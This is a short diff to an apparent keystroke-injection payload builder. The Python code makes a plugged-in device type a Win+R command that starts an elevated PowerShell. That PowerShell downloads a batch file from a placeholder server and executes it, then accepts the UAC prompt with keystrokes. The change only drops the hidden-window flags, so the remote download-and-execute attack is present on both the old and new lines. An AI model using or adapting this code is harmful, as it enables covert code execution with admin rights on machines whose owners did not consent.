@@ -34,7 +34,7 @@ class PayloadBuilder:
         return [
             {'action': 'combo', 'keys': ['WIN', 'r']},
             {'action': 'delay', 'ms': 500},
-            {'action': 'type', 'text': f'powershell -w hidden -c "Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList \'-nop -w hidden -c iwr http://{{{{SERVER_IP}}}}/payloads/{bat_filename} -OutFile $env:TEMP\\p.bat; cmd /c $env:TEMP\\p.bat\'"'},
+            {'action': 'type', 'text': f'powershell -c "Start-Process powershell -Verb runAs -ArgumentList \'-nop -c iwr http://{{{{SERVER_IP}}}}/payloads/{bat_filename} -OutFile $env:TEMP\\p.bat; cmd /c $env:TEMP\\p.bat\'"'},
             {'action': 'combo', 'keys': ['CTRL', 'SHIFT', 'ENTER']},
             {'action': 'delay', 'ms': 6000},
             {'action': 'combo', 'keys': ['ALT', 'y']},
